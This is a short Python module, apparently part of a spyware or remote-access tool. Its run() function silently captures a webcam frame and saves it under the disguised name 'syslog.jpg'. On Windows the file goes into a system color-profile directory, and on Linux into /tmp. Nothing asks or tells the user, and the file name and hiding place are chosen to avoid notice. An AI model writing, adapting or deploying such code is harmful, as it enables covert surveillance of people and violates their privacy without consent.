def run():
    from cv2 import VideoCapture, imwrite
    import platform
    import os
    cam = VideoCapture(0)

    ret, frame = cam.read()

    if ret:
        if platform.system() == "Windows":
            path = "C:\\Windows\\System32\\spool\\drivers\\color\\syslog.jpg"
            imwrite(path, frame)
        if platform.system() == "Linux":
            path = "/tmp/syslog.jpg"
            imwrite(path, frame)
    cam.release()